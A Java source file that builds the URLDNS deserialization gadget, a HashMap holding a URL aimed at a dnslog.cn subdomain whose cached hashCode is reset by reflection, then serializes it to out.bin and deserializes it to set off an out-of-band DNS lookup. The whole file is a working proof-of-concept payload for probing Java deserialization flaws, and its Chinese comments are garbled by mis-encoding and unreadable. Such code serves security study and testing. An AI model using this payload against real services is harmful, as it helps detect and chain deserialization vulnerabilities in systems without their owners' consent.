package URLDNS;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class URLDNS {

    public static void main(String[] args) throws Exception {
        HashMap<URL, String> hashMap = new HashMap<URL, String>();// ����һ��hashMap��keyΪURL,valueΪString
        URL url = new URL("http://nk3z5e.dnslog.cn");// �������Ǵ���dns��ѯ��url

        // ������putǰ�޸�url��hashcodeΪ��-1��ֵ��put��hashcode�޸�Ϊ-1
        // 1. ��url��hashCode�ֶ�����Ϊ�����޸�
        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
        f.setAccessible(true);
        // 2. ����url��hashCode�ֶ�Ϊ���ⲻΪ-1��ֵ
        f.set(url, 111);
        System.out.println(url.hashCode()); // ��ȡhashCode��ֵ����֤�Ƿ��޸ĳɹ�
        // 3. �� url ���� hashMap �У��ұ߲������д
        hashMap.put(url, "" +
                "");
        // 4. �޸�url��hashCode�ֶ�Ϊ-1��Ϊ�˴���DNS��ѯ��֮�����ͣ�
        f.set(url, -1);

        //���л�����
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("out.bin"));
        oos.writeObject(hashMap);

        //�����л�������payload
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("out.bin"));
        ois.readObject();
    }
}
